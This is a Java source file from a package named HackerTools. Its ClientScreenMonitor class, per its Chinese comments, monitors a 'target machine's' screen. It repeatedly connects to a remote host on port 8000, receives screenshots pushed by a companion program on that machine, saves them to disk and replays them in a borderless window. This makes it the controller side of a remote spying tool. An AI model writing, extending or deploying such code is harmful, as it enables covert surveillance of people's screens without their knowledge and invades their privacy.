package HackerTools;

import java.awt.Container;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.WindowConstants;

/**
 * 获取目标机屏幕监控
 * */
public class ClientScreenMonitor {
    public static int screenport = 8000;
    public static String ipaddress = Index.ipAddress;
    static int k = 0;
    static int count=0;
    static int speed = 300;
    static boolean flag = true;
    static String dirpath = null;
    public static Thread mythread;

    public ClientScreenMonitor(int screenport) {
        if (screenport != 0)
            this.screenport = screenport;
        File file = new File("picture"); // 创建文件夹存储图片
        dirpath = file.getAbsolutePath();
        if (!file.exists()) {
            file.mkdir();
        }

        Thread thread1 = new Thread() {
            public void run() {
                try {
                    recieve_picture();
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        };
        thread1.start();
    }

    public static void recieve_picture() throws Exception  { // 接受图片
        // System.out.println("---aa---");
        while (flag) {
            System.out.println("---aa---");
            System.out.println(dirpath + "\\server_capture" + k + ".png");
            try {
                Socket s = new Socket(ipaddress, screenport);
                //s.setSoTimeout(2000);
                System.out.println("you are conneted with the server...the port is"
                        + screenport);

                System.out.println("检测到客户端，准备数据接收");
                //检测到客户端后设置图标为已成功连接
                ToolBar.lightBtn.setText("已成功连接");
                ToolBar.lightBtn.setIcon(new ImageIcon("lvdengxia.png"));

                InputStream in;
                in = s.getInputStream();
                FileOutputStream fos = new FileOutputStream(dirpath
                        + "\\server_capture" + k + ".png");
                byte[] buf = new byte[4096];
                int len = 0;
                while ((len = in.read(buf)) != -1) {
                    fos.write(buf, 0, len);
                }
                OutputStream out = s.getOutputStream();
                fos.close();
                in.close();
                out.close();
                s.close();
                File cache=new File(dirpath+ "\\server_capture" + k + ".png");
                //if(cache.exists()&&cache.isFile()&&cache.length()/1024>30)
                k++;
                Thread.sleep(speed);
            } catch (IOException e) {
                // TODO Auto-generated catch block
                JOptionPane.showMessageDialog(null, "请开启服务端后重试");
                e.printStackTrace();

                continue;
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                JOptionPane.showMessageDialog(null, "请开启服务端后重试");
                e.printStackTrace();
                continue;
            }


        }
    }

    public static void play_picture() throws IOException {

        int count = 0;
        final JFrame frame = new JFrame("屏幕监控，端口为：" + screenport);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setLayout(null);
        frame.setSize(800, 640);
        frame.setLocationRelativeTo(null);
        frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);

        JButton button_close = new JButton();
        button_close.setText("X");
        Font f = new Font("宋体", Font.PLAIN, 18);
        button_close.setFont(f);
        button_close.setBounds(740, 5 , 50, 30);
        button_close.setFocusPainted(false);// 设置不绘制焦点
        frame.add(button_close);
        frame.setUndecorated(true);
        frame.setVisible(true);

        button_close.addActionListener(new ActionListener() {
            @SuppressWarnings("deprecation")
            public void actionPerformed(ActionEvent e) {
                // TODO Auto-generated method stub
                mythread.stop();
                frame.dispose();
            }
        });

        // TODO Auto-generated method stub
        while (flag) {
            System.out.println("--" + count + "--");
            String path = dirpath + "\\server_capture" + count + ".png";
            File file = new File(path);
            if (file.exists()&&file.isFile()) {
                if(count==500)count=0;

                path = dirpath + "\\server_capture" + count + ".png";
                System.out.println(path + "!!!!");
                ImageIcon img = new ImageIcon(path);// 这是背景图片

                JLabel imgLabel = new JLabel(img);
                frame.getLayeredPane().add(imgLabel);// 注意这里是关键，将背景标签添加到jfram的LayeredPane面板里。
                frame.getLayeredPane().moveToFront(imgLabel); // 将当前的一层移到顶层，没有这一步只会有第一张图片
                imgLabel.setBounds(0, 40, 800,
                        600);

                Container cp = frame.getContentPane();
                ((JPanel) cp).setOpaque(false); // 注意这里，将内容面板设为透明。这样LayeredPane面板中的背景才能显示出来。
                count = count + 1;

                try {
                    Thread.sleep(speed);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            } else {
                try {
                    Thread.sleep(300);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
    }

    public void setport(int screenport) { // 设置接收端口
        this.screenport = screenport;
    }

    public int getport() { // 获得接受端口
        return screenport;
    }

    public void setspeed(int speed) { // 改变播放速度
        this.speed = speed;
    }

    public void setflag(boolean flag) { // 结束视频监控
        this.flag = flag;
    }
}
